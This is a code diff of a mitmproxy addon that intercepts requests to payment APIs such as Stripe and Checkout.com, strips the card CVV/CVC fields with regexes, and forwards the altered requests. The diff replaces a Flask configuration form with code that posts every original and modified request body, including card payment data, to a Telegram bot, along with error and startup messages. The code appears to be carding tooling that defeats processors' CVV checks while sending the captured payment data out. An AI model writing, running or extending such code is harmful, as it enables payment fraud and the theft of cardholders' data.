@@ -1,15 +1,12 @@
-
 import re
+import requests
 from mitmproxy import http, ctx
-from mitmproxy.addonmanager import Loader
-from mitmproxy.tools.web.master import WebMaster
-from mitmproxy.web import webapp
-from flask import Flask, request, render_template_string, jsonify
 
-# Initialize the Flask app
-app = Flask(__name__)
+# Telegram bot token and chat ID
+TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'
+TELEGRAM_CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID'
 
-# Global variable to store domain keys mapping
+# Domains to intercept for modifying requests and corresponding keys
 DOMAIN_KEYS_MAPPING = {
     "api.stripe.com": [
         rb"payment_method_data\[card\]\[cvc\]=[\d]{3,4}",
@@ -17,7 +14,7 @@ DOMAIN_KEYS_MAPPING = {
         rb"source_data\[card\]\[cvc\]=[\d]{3,4}"
     ],
     "cloud.boosteroid.com": [
-        rb"encryptedSecurityCode\":\s*\"[\d]{3,4}\""
+        rb"encryptedSecurityCode\":\s*\"[^\"]+\""
     ],
     "api.checkout.com": [
         rb"\"cvv\":\s*\"[\d]{3,4}\""
@@ -36,52 +33,18 @@ DOMAIN_KEYS_MAPPING = {
     ]
 }
 
-# HTML template for the web form
-HTML_TEMPLATE = """
-<!doctype html>
-<html lang="en">
-<head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-    <title>Add Domain Mapping</title>
-</head>
-<body>
-    <div style="max-width: 600px; margin: auto;">
-        <h1>Add Domain Mapping</h1>
-        <form action="/add_mapping" method="post">
-            <div>
-                <label for="domain">API Domain:</label>
-                <input type="text" id="domain" name="domain" required>
-            </div>
-            <div>
-                <label for="regex">CVV Regex:</label>
-                <input type="text" id="regex" name="regex" required>
-            </div>
-            <div>
-                <button type="submit">Add Mapping</button>
-            </div>
-        </form>
-    </div>
-</body>
-</html>
-"""
-
-@app.route('/', methods=['GET'])
-def index():
-    return render_template_string(HTML_TEMPLATE)
-
-@app.route('/add_mapping', methods=['POST'])
-def add_mapping():
-    domain = request.form.get('domain')
-    regex = request.form.get('regex')
-    
-    if domain and regex:
-        if domain not in DOMAIN_KEYS_MAPPING:
-            DOMAIN_KEYS_MAPPING[domain] = []
-        DOMAIN_KEYS_MAPPING[domain].append(re.compile(regex.encode()))
-        return jsonify({"status": "success", "message": "Mapping added"}), 200
-    else:
-        return jsonify({"status": "error", "message": "Invalid input"}), 400
+def send_telegram_message(message):
+    """
+    Sends a message to the specified Telegram chat.
+    """
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+    payload = {
+        "chat_id": TELEGRAM_CHAT_ID,
+        "text": message,
+        "parse_mode": "Markdown"
+    }
+    response = requests.post(url, data=payload)
+    return response
 
 def clean_up_trailing_characters(request_body, domain):
     """
@@ -99,46 +62,71 @@ def remove_cvc_from_request_body(request_body, keys_to_remove):
         request_body = re.sub(key, b"", request_body)
     return request_body
 
+def format_message(domain, original_body, modified_body):
+    """
+    Formats the message to be sent to Telegram.
+    """
+    message = (
+        f"*Domain:* {domain}\n"
+        f"*Original Request Body:*\n```\n{original_body}\n```\n"
+        f"*Modified Request Body:*\n```\n{modified_body}\n```"
+    )
+    return message
+
+def format_error_message(domain, error_message):
+    """
+    Formats the error message to be sent to Telegram.
+    """
+    message = (
+        f"*Domain:* {domain}\n"
+        f"*Error Message:*\n```\n{error_message}\n```"
+    )
+    return message
+
 def request(flow: http.HTTPFlow):
     """
     This function intercepts and modifies requests to remove CVV data.
     """
-    for domain, keys in DOMAIN_KEYS_MAPPING.items():
-        if domain in flow.request.pretty_host:
-            if keys:
-                # Log original request data for debugging
-                ctx.log.info(f"Original Request Body for {domain}: {flow.request.content.decode('utf-8', errors='ignore')}")
+    try:
+        for domain, keys in DOMAIN_KEYS_MAPPING.items():
+            if domain in flow.request.pretty_host:
+                if keys:
+                    # Get original request body for logging
+                    original_request_body = flow.request.content.decode('utf-8', errors='ignore')
+                    ctx.log.info(f"Original Request Body for {domain}: {original_request_body}")
 
-                # Remove CVV codes from the payment data
-                modified_body = remove_cvc_from_request_body(flow.request.content, keys)
-                
-                # Clean up any trailing characters if necessary
-                modified_body = clean_up_trailing_characters(modified_body, domain)
+                    # Remove CVV codes from the payment data
+                    modified_body = remove_cvc_from_request_body(flow.request.content, keys)
+                    
+                    # Clean up any trailing characters if necessary
+                    modified_body = clean_up_trailing_characters(modified_body, domain)
 
-                # Log modified request data for debugging
-                ctx.log.info(f"Modified Request Body for {domain}: {modified_body.decode('utf-8', errors='ignore')}")
+                    # Get modified request body for logging
+                    modified_request_body = modified_body.decode('utf-8', errors='ignore')
+                    ctx.log.info(f"Modified Request Body for {domain}: {modified_request_body}")
 
-                # Set the modified body back to the request
-                flow.request.content = modified_body
-            else:
-                ctx.log.info(f"Skipping request interception for domain: {domain}")
+                    # Format and send log message to Telegram
+                    message = format_message(domain, original_request_body, modified_request_body)
+                    send_telegram_message(message)
+
+                    # Set the modified body back to the request
+                    flow.request.content = modified_body
+                else:
+                    ctx.log.info(f"Skipping request interception for domain: {domain}")
+    except Exception as e:
+        error_message = str(e)
+        ctx.log.error(f"Error processing request for {domain}: {error_message}")
+        formatted_error_message = format_error_message(domain, error_message)
+        send_telegram_message(formatted_error_message)
 
 def start():
     """
     Function executed when the proxy starts.
     """
     ctx.log.info("Proxy server started. Ready to intercept requests.")
-
-    # Start Flask app on a separate thread
-    from threading import Thread
-    def run_app():
-        app.run(host='0.0.0.0', port=5000)
-
-    thread = Thread(target=run_app)
-    thread.daemon = True
-    thread.start()
+    send_telegram_message("Proxy server started. Ready to intercept requests.")
 
 # Attach handlers to mitmproxy
 addons = [
     request
-    ]
+]
